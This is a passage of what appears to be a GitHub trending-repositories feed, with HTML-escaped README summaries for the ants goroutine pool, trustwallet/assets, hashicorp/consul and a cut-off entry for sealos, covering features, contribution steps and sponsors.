is&amp;nbsp;reduced&amp;nbsp;by&amp;nbsp;10&amp;nbsp;to&amp;nbsp;20&amp;nbsp;times.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;👏 Contributors&lt;/h2&gt; &#xA;&lt;p&gt;Please read our &lt;a href=&#34;https://raw.githubusercontent.com/panjf2000/ants/master/CONTRIBUTING.md&#34;&gt;Contributing Guidelines&lt;/a&gt; before opening a PR and thank you to all the developers who already made contributions to &lt;code&gt;ants&lt;/code&gt;!&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/panjf2000/ants/graphs/contributors&#34;&gt;&lt;img src=&#34;https://opencollective.com/ants/contributors.svg?width=890&amp;amp;button=false&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;📄 License&lt;/h2&gt; &#xA;&lt;p&gt;Source code in &lt;code&gt;ants&lt;/code&gt; is available under the &lt;a href=&#34;https://raw.githubusercontent.com/panjf2000/ants/master/LICENSE&#34;&gt;MIT License&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;📚 Relevant Articles&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://taohuawu.club/high-performance-implementation-of-goroutine-pool&#34;&gt;Goroutine 并发调度模型深度解析之手撸一个高性能 goroutine 池&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/coinmonks/visually-understanding-worker-pool-48a83b7fc1f5&#34;&gt;Visually Understanding Worker Pool&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://brandur.org/go-worker-pool&#34;&gt;The Case For A Go Worker Pool&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twin.sh/articles/39/go-concurrency-goroutines-worker-pools-and-throttling-made-simple&#34;&gt;Go Concurrency - GoRoutines, Worker Pools and Throttling Made Simple&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;🖥 Use cases&lt;/h2&gt; &#xA;&lt;h3&gt;business companies&lt;/h3&gt; &#xA;&lt;p&gt;The following companies/organizations use &lt;code&gt;ants&lt;/code&gt; in production.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.tencent.com&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/tencent_logo.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.bytedance.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/ByteDance_Logo.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://tieba.baidu.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/baidu-tieba-logo.png&#34; width=&#34;300&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.sina.com.cn/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/sina-logo.png&#34; width=&#34;200&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.163.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/netease-logo.png&#34; width=&#34;150&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.tencentmusic.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/tencent-music-logo.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.futuhk.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/futu-logo.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.shopify.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/shopify-logo.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&#34;https://www.wechat.com/en/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/wechat-logo.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&lt;a href=&#34;https://www.baidu.com/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;http://img.taohuawu.club/gallery/baidu-mobile.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;open-source software&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/panjf2000/gnet&#34;&gt;gnet&lt;/a&gt;: A high-performance, lightweight, non-blocking, event-driven networking framework written in pure Go.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ehang-io/nps&#34;&gt;nps&lt;/a&gt;: A lightweight, high-performance, powerful intranet penetration proxy server, with a powerful web management terminal.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/milvus-io/milvus&#34;&gt;milvus&lt;/a&gt;: An open-source vector database for scalable similarity search and AI applications.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/j3ssie/osmedeus&#34;&gt;osmedeus&lt;/a&gt;: A Workflow Engine for Offensive Security.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jitsucom/jitsu&#34;&gt;jitsu&lt;/a&gt;: An open-source Segment alternative. Fully-scriptable data ingestion engine for modern data teams. Set-up a real-time data pipeline in minutes, not days.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RH12503/triangula&#34;&gt;triangula&lt;/a&gt;: Generate high-quality triangulated and polygonal art from images.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/binance-chain/bsc&#34;&gt;bsc&lt;/a&gt;: A Binance Smart Chain client based on the go-ethereum fork.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jaeles-project/jaeles&#34;&gt;jaeles&lt;/a&gt;: The Swiss Army knife for automated Web Application Testing.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/apache/incubator-devlake&#34;&gt;devlake&lt;/a&gt;: The open-source dev data platform &amp;amp; dashboard for your DevOps tools.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;All use cases:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/panjf2000/ants/network/dependents?package_id=UGFja2FnZS0yMjY2ODgxMjg2&#34;&gt;Repositories that depend on ants/v2&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/panjf2000/ants/network/dependents?package_id=UGFja2FnZS0yMjY0ODMzNjEw&#34;&gt;Repositories that depend on ants/v1&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you have &lt;code&gt;ants&lt;/code&gt; integrated into projects, feel free to open a pull request refreshing this list of use cases.&lt;/p&gt; &#xA;&lt;h2&gt;🔋 JetBrains OS licenses&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;ants&lt;/code&gt; had been being developed with GoLand under the &lt;strong&gt;free JetBrains Open Source license(s)&lt;/strong&gt; granted by JetBrains s.r.o., hence I would like to express my thanks here.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.jetbrains.com/?from=ants&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/jetbrains/jetbrains-variant-4.png&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;💰 Backers&lt;/h2&gt; &#xA;&lt;p&gt;Support us with a monthly donation and help us continue our activities.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opencollective.com/ants#backers&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://opencollective.com/ants/backers.svg?sanitize=true&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;💎 Sponsors&lt;/h2&gt; &#xA;&lt;p&gt;Become a bronze sponsor with a monthly donation of $10 and get your logo on our README on Github.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opencollective.com/ants#sponsors&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://opencollective.com/ants/sponsors.svg?sanitize=true&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;☕️ Buy me a coffee&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Please be sure to leave your name, GitHub account or other social media accounts when you donate by the following means so that I can add it to the list of donors as a token of my appreciation.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/payments/WeChatPay.JPG&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&amp;nbsp;&amp;nbsp; &lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/payments/AliPay.JPG&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&amp;nbsp;&amp;nbsp; &lt;a href=&#34;https://www.paypal.me/R136a1X&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/payments/PayPal.JPG&#34; width=&#34;250&#34; align=&#34;middle&#34;&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;/p&gt; &#xA;&lt;h2&gt;💵 Patrons&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/patrick-othmer&#34;&gt;&lt;img src=&#34;https://avatars1.githubusercontent.com/u/8964313&#34; width=&#34;100&#34; alt=&#34;Patrick Othmer&#34;&gt;&lt;/a&gt;&amp;nbsp;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/panjf2000/gnet&#34;&gt;&lt;img src=&#34;https://avatars2.githubusercontent.com/u/50285334&#34; width=&#34;100&#34; alt=&#34;Jimmy&#34;&gt;&lt;/a&gt;&amp;nbsp;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/cafra&#34;&gt;&lt;img src=&#34;https://avatars0.githubusercontent.com/u/13758306&#34; width=&#34;100&#34; alt=&#34;ChenZhen&#34;&gt;&lt;/a&gt;&amp;nbsp;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/yangwenmai&#34;&gt;&lt;img src=&#34;https://avatars0.githubusercontent.com/u/1710912&#34; width=&#34;100&#34; alt=&#34;Mai Yang&#34;&gt;&lt;/a&gt;&amp;nbsp;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/BeijingWks&#34;&gt;&lt;img src=&#34;https://avatars3.githubusercontent.com/u/33656339&#34; width=&#34;100&#34; alt=&#34;王开帅&#34;&gt;&lt;/a&gt;&amp;nbsp;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/refs&#34;&gt;&lt;img src=&#34;https://avatars3.githubusercontent.com/u/6905948&#34; width=&#34;100&#34; alt=&#34;Unger Alejandro&#34;&gt;&lt;/a&gt;&amp;nbsp;&lt;a target=&#34;_blank&#34; href=&#34;https://github.com/Wuvist&#34;&gt;&lt;img src=&#34;https://avatars.githubusercontent.com/u/657796&#34; width=&#34;100&#34; alt=&#34;Weng Wei&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;🔋 Sponsorship&lt;/h2&gt; &#xA;&lt;p&gt; &lt;a href=&#34;https://www.digitalocean.com/&#34;&gt; &lt;img src=&#34;https://opensource.nyc3.cdn.digitaloceanspaces.com/attribution/assets/PoweredByDO/DO_Powered_by_Badge_blue.svg?sanitize=true&#34; width=&#34;201px&#34;&gt; &lt;/a&gt; &lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>trustwallet/assets</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/trustwallet/assets</id>
    <link href="https://github.com/trustwallet/assets" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A comprehensive, up-to-date collection of information about several thousands (!) of crypto tokens.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Trust Wallet Assets Info&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/trustwallet/assets/workflows/Check/badge.svg?sanitize=true&#34; alt=&#34;Check&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;Trust Wallet token repository is a comprehensive, up-to-date collection of information about several thousands (!) of crypto tokens.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://trustwallet.com&#34;&gt;Trust Wallet&lt;/a&gt; uses token logos from this source, alongside a number of other projects.&lt;/p&gt; &#xA;&lt;p&gt;The repository contains token info from several blockchains, info on dApps, staking validators, etc. For every token a logo and optional additional information is available (such data is not available on-chain).&lt;/p&gt; &#xA;&lt;p&gt;Such a large collection can be maintained only through a community effort, so &lt;em&gt;feel free to add your token&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;center&gt;&#xA; &lt;img src=&#34;https://trustwallet.com/assets/images/media/assets/horizontal_blue.png&#34; height=&#34;200&#34;&gt;&#xA;&lt;/center&gt; &#xA;&lt;h2&gt;How to add token&lt;/h2&gt; &#xA;&lt;p&gt;Please note that &lt;strong&gt;brand new tokens are not accepted&lt;/strong&gt;, the projects have to be sound, with information available, and &lt;strong&gt;non-minimal circulation&lt;/strong&gt; (for limit details see &lt;a href=&#34;https://developer.trustwallet.com/assets/requirements&#34;&gt;https://developer.trustwallet.com/assets/requirements&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;h3&gt;Assets App&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://assets.trustwallet.com&#34;&gt;Assets web app&lt;/a&gt; can be used for most new token additions (Github account is needed).&lt;/p&gt; &#xA;&lt;h3&gt;Quick starter&lt;/h3&gt; &#xA;&lt;p&gt;Details of the repository structure and contribution guidelines are listed on the &lt;a href=&#34;https://developer.trustwallet.com/assets/new-asset&#34;&gt;Developers site&lt;/a&gt;. Here is a quick starter summary for the most common use case.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;For details, see the &lt;a href=&#34;https://developer.trustwallet.com&#34;&gt;Developers site&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://developer.trustwallet.com/assets/repository_details&#34;&gt;Contribution guidelines&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://developer.trustwallet.com/assets/faq&#34;&gt;FAQ&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Scripts&lt;/h2&gt; &#xA;&lt;p&gt;There are several scripts available for maintainers:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;make check&lt;/code&gt; -- Execute validation checks; also used in continuous integration.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;make fix&lt;/code&gt; -- Perform automatic fixes where possible&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;make update-auto&lt;/code&gt; -- Run automatic updates from external sources, executed regularly (GitHub action)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;make add-token asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53&lt;/code&gt; -- Create &lt;code&gt;info.json&lt;/code&gt; file as asset template.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;make add-tokenlist asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53&lt;/code&gt; -- Adds a token to tokenlist.json.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;make add-tokenlist-extended asset_id=c60_t0x4Fabb145d64652a948d72533023f6E7A623C7C53&lt;/code&gt; -- Adds a token to tokenlist-extended.json.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;On Checks&lt;/h2&gt; &#xA;&lt;p&gt;This repo contains a set of scripts for verification of all the information. Implemented as Golang scripts, available through &lt;code&gt;make check&lt;/code&gt;, and executed in CI build; checks the whole repo. There are similar check logic implemented:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;in assets-management app; for checking changed token files in PRs, or when creating a PR. Checks diffs, can be run from browser environment.&lt;/li&gt; &#xA; &lt;li&gt;in merge-fee-bot, which runs as a GitHub app shows result in PR comment. Executes in a non-browser environment.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Trading pair maintenance&lt;/h2&gt; &#xA;&lt;p&gt;Info on supported trading pairs are stored in &lt;code&gt;tokenlist.json&lt;/code&gt; files. Trading pairs can be updated -- from Uniswap/Ethereum and PancakeSwap/Smartchain -- using update script (and checking in changes). Minimal limit values for trading pair inclusion are set in the &lt;a href=&#34;https://github.com/trustwallet/assets/raw/master/.github/assets.config.yaml&#34;&gt;config file&lt;/a&gt;. There are also options for force-include and force-exclude in the config.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;Trust Wallet team allows anyone to submit new assets to this repository. However, this does not mean that we are in direct partnership with all of the projects.&lt;/p&gt; &#xA;&lt;p&gt;Trust Wallet team will reject projects that are deemed as scam or fraudulent after careful review. Trust Wallet team reserves the right to change the terms of asset submissions at any time due to changing market conditions, risk of fraud, or any other factors we deem relevant.&lt;/p&gt; &#xA;&lt;p&gt;Additionally, spam-like behavior, including but not limited to mass distribution of tokens to random addresses will result in the asset being flagged as spam and possible removal from the repository.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hashicorp/consul</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/hashicorp/consul</id>
    <link href="https://github.com/hashicorp/consul" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Consul is a distributed, highly available, and data center aware solution to connect and configure applications across dynamic, distributed infrastructure.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hashicorp/consul/main/website/public/img/logo.svg?sanitize=true&#34; align=&#34;left&#34; height=&#34;46px&#34; alt=&#34;Consul logo&#34;&gt; &lt;span&gt;Consul&lt;/span&gt; &lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://hub.docker.com/_/consul&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/_/consul.svg?sanitize=true&#34; alt=&#34;Docker Pulls&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/hashicorp/consul&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/hashicorp/consul&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Consul is a distributed, highly available, and data center aware solution to connect and configure applications across dynamic, distributed infrastructure.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Website: &lt;a href=&#34;https://www.consul.io&#34;&gt;https://www.consul.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Tutorials: &lt;a href=&#34;https://learn.hashicorp.com/consul&#34;&gt;HashiCorp Learn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Forum: &lt;a href=&#34;https://discuss.hashicorp.com/c/consul&#34;&gt;Discuss&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Consul provides several key features:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Multi-Datacenter&lt;/strong&gt; - Consul is built to be datacenter aware, and can support any number of regions without complex configuration.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Service Mesh/Service Segmentation&lt;/strong&gt; - Consul Connect enables secure service-to-service communication with automatic TLS encryption and identity-based authorization. Applications can use sidecar proxies in a service mesh configuration to establish TLS connections for inbound and outbound connections without being aware of Connect at all.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Service Discovery&lt;/strong&gt; - Consul makes it simple for services to register themselves and to discover other services via a DNS or HTTP interface. External services such as SaaS providers can be registered as well.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Health Checking&lt;/strong&gt; - Health Checking enables Consul to quickly alert operators about any issues in a cluster. The integration with service discovery prevents routing traffic to unhealthy hosts and enables service level circuit breakers.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Key/Value Storage&lt;/strong&gt; - A flexible key/value store enables storing dynamic configuration, feature flagging, coordination, leader election and more. The simple HTTP API makes it easy to use anywhere.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Consul runs on Linux, macOS, FreeBSD, Solaris, and Windows and includes an optional &lt;a href=&#34;https://demo.consul.io&#34;&gt;browser based UI&lt;/a&gt;. A commercial version called &lt;a href=&#34;https://www.hashicorp.com/products/consul&#34;&gt;Consul Enterprise&lt;/a&gt; is also available.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please note&lt;/strong&gt;: We take Consul&#39;s security and our users&#39; trust very seriously. If you believe you have found a security issue in Consul, please &lt;a href=&#34;https://www.hashicorp.com/security#vulnerability-reporting&#34;&gt;responsibly disclose&lt;/a&gt; by contacting us at &lt;a href=&#34;mailto:security@hashicorp.com&#34;&gt;security@hashicorp.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Quick Start&lt;/h2&gt; &#xA;&lt;p&gt;A few quick start guides are available on the Consul website:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Standalone binary install:&lt;/strong&gt; &lt;a href=&#34;https://learn.hashicorp.com/tutorials/consul/get-started-install&#34;&gt;https://learn.hashicorp.com/tutorials/consul/get-started-install&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Minikube install:&lt;/strong&gt; &lt;a href=&#34;https://learn.hashicorp.com/tutorials/consul/kubernetes-minikube&#34;&gt;https://learn.hashicorp.com/tutorials/consul/kubernetes-minikube&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Kind install:&lt;/strong&gt; &lt;a href=&#34;https://learn.hashicorp.com/tutorials/consul/kubernetes-kind&#34;&gt;https://learn.hashicorp.com/tutorials/consul/kubernetes-kind&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Kubernetes install:&lt;/strong&gt; &lt;a href=&#34;https://learn.hashicorp.com/tutorials/consul/kubernetes-deployment-guide&#34;&gt;https://learn.hashicorp.com/tutorials/consul/kubernetes-deployment-guide&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Full, comprehensive documentation is available on the Consul website:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.consul.io/docs&#34;&gt;https://www.consul.io/docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Thank you for your interest in contributing! Please refer to &lt;a href=&#34;https://github.com/hashicorp/consul/raw/main/.github/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; for guidance. For contributions specifically to the browser based UI, please refer to the UI&#39;s &lt;a href=&#34;https://github.com/hashicorp/consul/raw/main/ui/packages/consul-ui/README.md&#34;&gt;README.md&lt;/a&gt; for guidance.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>labring/sealos</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/labring/sealos</id>
    <link href="https://github.com/labring/sealos" rel="alternate"></link>
    <summary type="html">&lt;p&gt;kubernetes-kernel-based Cloud OS! Let&#39;s sealos run kubernetes:v1.24.0&lt;/p&gt;&lt;hr&gt;&lt;a href=&#34;https://trackgit.com&#34;&gt; &lt;img src=&#34;https://us-central1-trackgit-analytics.cloudfunctions.net/token/ping/kexrkhvqjlzkdiap4zke&#34; alt=&#34;trackgit-views&#34;&gt; &lt;/a&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://socialify.git.ci/labring/sealos/image?description=1&amp;amp;descriptionEditable=Cloud%20OS%20distribution%20with%20Kubernetes%20as%20kernel.%20Practise%20cloud%20native%20like%20using%20macOS!&amp;amp;font=Source%20Code%20Pro&amp;amp;forks=1&amp;amp;language=1&amp;amp;pattern=Charlie%20Brown&amp;amp;stargazers=1&amp;amp;theme=Light&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt; &lt;b&gt;Popularize cloud native technologies with ease&lt;/b&gt; &lt;/p&gt; &#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/labring/sealos&#34;&gt;&lt;img src=&#34;https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg?sanitize=true&#34; alt=&#34;Awesome&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/labring/sealos/actions&#34;&gt;&lt;img src=&#34;https://github.com/labring/sealos/actions/workflows/release.yml/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://sealyun.com&#34;&gt;&lt;img src=&#34;https://img.shields.io/website?url=https%3A%2F%2Fpostwoman.io&amp;amp;logo=Postwoman&#34; alt=&#34;Website&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/labring/sealos&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/labring/sealos&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://t.me/cloudnativer&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/chat-Telegram-blueviolet?logo=Telegram&#34; alt=&#34;Chat on Telegram&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;English | &lt;a href=&#34;https://raw.githubusercontent.com/labring/sealos/main/docs/4.0/README.md&#34;&gt;中文&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Documentation: &lt;em&gt;&lt;a href=&#34;https://www.sealyun.com&#34;&gt;Website&lt;/a&gt;, &lt;a href=&#34;https://icloudnative.io&#34;&gt;Blog&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Join us: DingTalk(35371178), &lt;a href=&#34;https://t.me/cloudnativer&#34;&gt;Telegram&lt;/a&gt;, QQ Group(98488045), Wechat：fangnux&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;What is sealos&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;sealos is a cloud operating system distribution with Kubernetes as its kernel.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;In the early stages, operatings systems have adopted a layered architecture， which later evolved into kernel architecture like Linux and Windows. With the emergence of container technologies, cloud OS will migrate to a &#34;cloud kernel&#34; architecture with strong cohesion in the future.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/8912557/170530230-16ad5607-700c-436a-930c-663e800cbf6e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;From now on, think of all your machines as an abstract supercomputer whose operating system is sealos, where Kubernetes serves as the OS kernel.&lt;/li&gt; &#xA; &lt;li&gt;Instead of IaaS, PaaS and SaaS, there will only be cloud OS drivers(CSI,CNI and CRI implementations), cloud OS kernel(Kubernetes) and distributed applications.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Core Capabilities&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Cluster image - The entire cluster will be able to build, ship and run. Semantics of docker will be extended to clusters so that any distributed applications can be defined and run smoothly.&lt;/li&gt; &#xA; &lt;li&gt;hub.sealos - A cluster image repository where you can retrieve pre-built distributed applications such as basic Kubernetes cluster image, high availability pgsql cluster image, high availability minio cluster image, etc.&lt;/li&gt; &#xA; &lt;li&gt;desktop.sealos - A desktop for cloud OS, not to be confused with traditional cloud desktop. It is similar to macOS, but manages cluster and distributed applications instead of personal computers.&lt;/li&gt; &#xA; &lt;li&gt;Distributed application matrix 